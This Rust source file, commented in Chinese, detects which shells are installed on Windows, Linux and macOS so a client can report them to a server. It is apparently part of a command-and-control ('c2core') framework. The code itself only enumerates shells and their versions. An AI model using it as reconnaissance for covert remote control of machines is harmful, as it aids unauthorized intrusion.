//! # Shell 探测模块
//!
//! 客户端启动时扫描本地环境，找出所有可用的 Shell，
//! 将结果作为 `AvailableShell` 列表上报给服务端。

use crate::c2core::protocol::ShellType;
use serde::{Deserialize, Serialize};
use std::path::Path;

/// 描述一个可用的 Shell 环境
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AvailableShell {
    pub shell_type: ShellType,
    /// 可执行文件路径，如 `"C:\\Windows\\System32\\cmd.exe"`
    pub path: String,
    /// 版本号，如 `"5.1.19041.4412"`
    pub version: String,
    /// 是否是系统默认 shell
    pub is_default: bool,
}

/// 扫描当前系统上所有可用的 Shell。
///
/// 各平台策略：
/// - **Windows** — 检查常见路径、注册表、`%PATH%`
/// - **Linux** — 读 `/etc/shells` + 检查常见路径
/// - **macOS** — 同 Linux + Homebrew 安装路径
pub fn detect_shells() -> Vec<AvailableShell> {
    let mut shells = Vec::new();

    #[cfg(target_os = "windows")]
    detect_windows(&mut shells);

    #[cfg(target_os = "linux")]
    detect_linux(&mut shells);

    #[cfg(target_os = "macos")]
    detect_macos(&mut shells);

    shells
}

// ── 工具函数 ───────────────────────────────────────────────────────

/// 尝试执行 `<exe> --version` 并提取第一行作为版本字符串
fn probe_version(exe: &str) -> String {
    std::process::Command::new(exe)
        .arg("--version")
        .output()
        .ok()
        .and_then(|o| {
            if o.status.success() {
                let s = String::from_utf8_lossy(&o.stdout);
                s.lines().next().map(|l| l.trim().to_string())
            } else {
                None
            }
        })
        .unwrap_or_else(|| "Unknown".into())
}

/// 检查路径是否存在且是文件
fn is_exe(path: &str) -> bool {
    Path::new(path).is_file()
}

// ── Windows ────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn detect_windows(shells: &mut Vec<AvailableShell>) {
    // 1. CMD (系统默认)
    let cmd_path = "C:\\Windows\\System32\\cmd.exe";
    if is_exe(cmd_path) {
        shells.push(AvailableShell {
            shell_type: ShellType::Cmd,
            path: cmd_path.into(),
            version: probe_version(cmd_path),
            is_default: true,
        });
    }

    // 2. PowerShell 5.1 — 检查 System32 下的 powershell.exe
    let ps51_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    if is_exe(ps51_path) {
        // 用 PowerShell 自身获取版本号
        let version = std::process::Command::new(ps51_path)
            .args(["-NoProfile", "-Command", "$PSVersionTable.PSVersion"])
            .output()
            .ok()
            .and_then(|o| {
                if o.status.success() {
                    Some(String::from_utf8_lossy(&o.stdout).trim().to_string())
                } else {
                    None
                }
            })
            .unwrap_or_else(|| "Unknown".into());

        shells.push(AvailableShell {
            shell_type: ShellType::PowerShell51,
            path: ps51_path.into(),
            version,
            is_default: false,
        });
    }

    // 3. PowerShell 7 (PowerShell Core) — Program Files
    for base in [
        "C:\\Program Files\\PowerShell\\7",
        "C:\\Program Files\\PowerShell\\7-preview",
    ] {
        let pwsh = format!("{base}\\pwsh.exe");
        if is_exe(&pwsh) {
            shells.push(AvailableShell {
                shell_type: ShellType::PowerShell7,
                path: pwsh,
                version: probe_version("pwsh.exe"),
                is_default: false,
            });
            break;
        }
    }

    // 4. Git Bash
    for base in [
        "C:\\Program Files\\Git\\bin\\bash.exe",
        "C:\\Program Files (x86)\\Git\\bin\\bash.exe",
    ] {
        if is_exe(base) {
            shells.push(AvailableShell {
                shell_type: ShellType::GitBash,
                path: base.into(),
                version: probe_version(base),
                is_default: false,
            });
            break;
        }
    }

    // 5. NuShell (从 PATH 找)
    if let Ok(path) = std::env::var("PATH") {
        for dir in std::env::split_paths(&path) {
            let nu_path = dir.join("nu.exe");
            if nu_path.is_file() {
                let path_str = nu_path.to_string_lossy().to_string();
                shells.push(AvailableShell {
                    shell_type: ShellType::Nu,
                    path: path_str,
                    version: probe_version("nu.exe"),
                    is_default: false,
                });
                break;
            }
        }
    }
}

// ── Linux ──────────────────────────────────────────────────────────

#[cfg(any(target_os = "linux", target_os = "macos"))]
fn detect_linux(shells: &mut Vec<AvailableShell>) {
    use std::fs;

    // 1. 读 /etc/shells
    let known = fs::read_to_string("/etc/shells").ok();
    let entries: Vec<&str> = known
        .as_deref()
        .unwrap_or("")
        .lines()
        .filter(|l| !l.starts_with('#') && !l.is_empty())
        .collect();

    for path in &entries {
        let exe = match *path {
            p if p.ends_with("/bash") => Some(ShellType::Bash),
            p if p.ends_with("/zsh") => Some(ShellType::Zsh),
            p if p.ends_with("/sh") => Some(ShellType::Sh),
            p if p.ends_with("/nu") => Some(ShellType::Nu),
            _ => None,
        };
        if let Some(shell_type) = exe {
            let version = probe_version(path);
            shells.push(AvailableShell {
                shell_type,
                path: path.to_string(),
                version,
                is_default: path.ends_with("/bash") || path.ends_with("/sh"),
            });
        }
    }

    // 2. 如果 /etc/shells 没读到或没覆盖，再扫 PATH
    if shells.is_empty() {
        if let Ok(path) = std::env::var("PATH") {
            for dir in std::env::split_paths(&path) {
                for (name, shell_type) in [
                    ("bash", ShellType::Bash),
                    ("zsh", ShellType::Zsh),
                    ("sh", ShellType::Sh),
                    ("nu", ShellType::Nu),
                ] {
                    let exe_path = dir.join(name);
                    if exe_path.is_file() {
                        let path_str = exe_path.to_string_lossy().to_string();
                        if !shells.iter().any(|s| s.path == path_str) {
                            shells.push(AvailableShell {
                                shell_type,
                                path: path_str,
                                version: probe_version(name),
                                is_default: name == "bash" || name == "sh",
                            });
                        }
                    }
                }
            }
        }
    }
}

// ── macOS ──────────────────────────────────────────────────────────

#[cfg(target_os = "macos")]
fn detect_macos(shells: &mut Vec<AvailableShell>) {
    // macOS 基本同 Linux，先读 /etc/shells
    detect_linux(shells);

    // 额外：Homebrew 安装的 bash/zsh（路径不同）
    for (path, shell_type) in [
        ("/opt/homebrew/bin/bash", ShellType::Bash),
        ("/opt/homebrew/bin/zsh", ShellType::Zsh),
        ("/opt/homebrew/bin/nu", ShellType::Nu),
        ("/usr/local/bin/bash", ShellType::Bash),
        ("/usr/local/bin/zsh", ShellType::Zsh),
    ] {
        if is_exe(path) && !shells.iter().any(|s| s.path == path) {
            shells.push(AvailableShell {
                shell_type,
                path: path.into(),
                version: probe_version(path),
                is_default: false,
            });
        }
    }
}
